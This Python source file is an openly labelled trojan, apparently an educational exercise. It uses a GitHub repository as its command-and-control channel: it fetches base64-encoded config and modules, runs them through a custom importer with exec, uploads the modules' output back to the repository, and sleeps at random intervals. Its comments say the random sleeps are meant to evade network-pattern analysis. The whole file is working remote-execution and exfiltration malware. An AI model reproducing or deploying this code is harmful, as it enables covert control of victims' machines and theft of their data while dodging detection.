# Import Modules
import base64 # Encode or decode data in base64.
import github3 # A library for interacting with the GitHub API which allows for retrieving data and pushing files. 
import importlib # Allows for dynamically importing modules.
import json # Handles JSON files. Used for parsing configuration files.
import random # Generate random numbers to be used to create random intervals between tasks.
import sys # Command-line inputs and outputs.
import threading # Provide multithreading support.
import time # Used to add a delay to the requests.

from datetime import datetime # Handles date and time related operations.

TIMESTART = time.time()
TIMEOUT = 30 # Defines the length of how long the program will run (time is in seconds).

# Connects to a specified GitHub repository.
def github_connect():
    with open('mytoken.txt') as f: # Stores the personal access token from the file to a variable.
        token = f.read()
    user = 'riichi-nomi-500404' # GitHub's username.
    sess = github3.login(token=token) # Personal access token.
    return sess.repository(user, 'third-time-the-charm') # Returns the personal access token, username, and the specified repository.

# Retrieves the contents of a file from the GitHub repository.
# This will be encoded in base64.
def get_file_contents(dirname, module_name, repo):
    return repo.file_contents(f'{dirname}/{module_name}').content # Specifiy the directory and file name to return its contents. 

# Handles dynamically importing modules from GitHub.
class GitImporter:
    # Initialize the class and stores the code of the module to be loaded. 
    def __init__(self):
        self.current_module_code = ""

    # Find a module from "modules" directory in GitHub repository.
    def find_module(self, name, path=None):
        print("[*] Attempting to retrieve %s" % name) # Prints out a message for debugging/logging purpose.
        self.repo = github_connect()

        new_library = get_file_contents('modules', f'{name}.py', self.repo)
        if new_library is not None:
            self.current_module_code = base64.b64decode(new_library) # Decodes base64 content. 
            return self

    # Register imported module to sys.modules directory to be used later. 
    def load_module(self, name):
        spec = importlib.util.spec_from_loader(name, loader=None,
                                               origin=self.repo.git_url)
        new_module = importlib.util.module_from_spec(spec) # Creates a blank module to store the imported GitHub module.
        exec(self.current_module_code, new_module.__dict__) # Execute the imported module.
        sys.modules[spec.name] = new_module # Registers the module to the sys.modules directory.
        return new_module

# Manages the trojan which will fetch configuration files, running modules, and storing the results.
class Trojan:
    # Initialize the trojan and sets up an id, paths for configuration file, paths for data storage, and connects to GitHub repository.
    def __init__(self, id):
        self.id = id # Sets up the unique identifier.
        self.config_file = f'{id}.json' # Path to the configuration file.
        self.data_path = f'data/{id}/' # Path for where the data will be stored.
        self.repo = github_connect() # Connnects to the GitHub repository.

    # Retrieve the configuration file from the repository.
    def get_config(self):
        config_json = get_file_contents('config', self.config_file, self.repo) # Retrieves the JSON file.
        config = json.loads(base64.b64decode(config_json)) # Decodes the base64 content.

        # Imports any modules needed for each task.
        for task in config:
            if task['module'] not in sys.modules:
                exec("import %s" % task['module'])
        return config

    # Execute any run() function of a module and store the results.
    def module_runner(self, module):
        result = sys.modules[module].run() # Executes the run() function in the module.
        self.store_module_result(result) # Stores the results from the module.

    # Stores the results from the run() function as a file in the GitHub repository.
    def store_module_result(self, data):
        message = datetime.now().isoformat() # Saves current date/time for the filename.
        remote_path = f'data/{self.id}/{message}.data' # Saves the filepath for the filename.
        # Checks to see if data is in bytes or not.
        if isinstance(data, bytes):
            self.repo.create_file(remote_path, message, base64.b64encode(data)) # Saves the file and encodes the data as base64.
        else:
            bindata = bytes('%r' % data, 'utf-8') # Converts and save the data as bytes.
            self.repo.create_file(remote_path, message, base64.b64encode(bindata)) # Saves the file and encodes the data as base64.

    # Main loop of the trojan to continuously fetch the configuration file and run the modules.
    def run(self):
        while True:
            print ('[*] Starting modules.') # Message for me saying the trojan has started.
            config = self.get_config() # Retrieves the configuration file from the repository.
            # Runs the modules in seperate threads.
            for task in config:
                thread = threading.Thread(
                    target=self.module_runner,
                    args=(task['module'],))
                thread.start()   
                time.sleep(10) # Delay between each module starting.
            time.sleep(5) # Delay to allow the modules to run.
            print ('[*] Data sent.') # Message for me to know both Modules has finished.
            time.sleep(random.randint(30*60, 3*60*60)) # Puts the trojan to sleep for a random amount of time to attempt to foil any network-pattern analysis.

# Checks if the script is being run directly to start its execution.
if __name__ == '__main__':
    sys.meta_path.append(GitImporter())# Appends GitImporter to sys.meta_path which enables dynamic imports.
    trojan = Trojan('logging') # Assigns the Trojan class and configuration name 'logging'.
    trojan.run() # Starts the main execution loop.